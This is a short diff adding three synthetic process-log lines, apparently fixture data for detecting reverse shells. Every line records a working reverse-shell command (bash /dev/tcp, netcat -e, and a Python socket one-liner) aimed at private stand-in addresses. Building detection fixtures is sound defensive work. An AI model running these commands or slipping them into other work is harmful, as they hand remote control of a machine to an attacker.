@@ -1,0 +1,3 @@
+2025-11-30T12:02:01Z host1 process[1234]: user=dev1 CommandLine=bash -i >& /dev/tcp/10.10.10.10/443 0>&1
+2025-11-30T12:02:05Z host2 process[2345]: user=ops CommandLine=/bin/nc -e /bin/bash 10.11.12.13 9999
+2025-11-30T12:05:10Z host1 process[1240]: user=dev1 CommandLine=python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/bash","-i"]);'
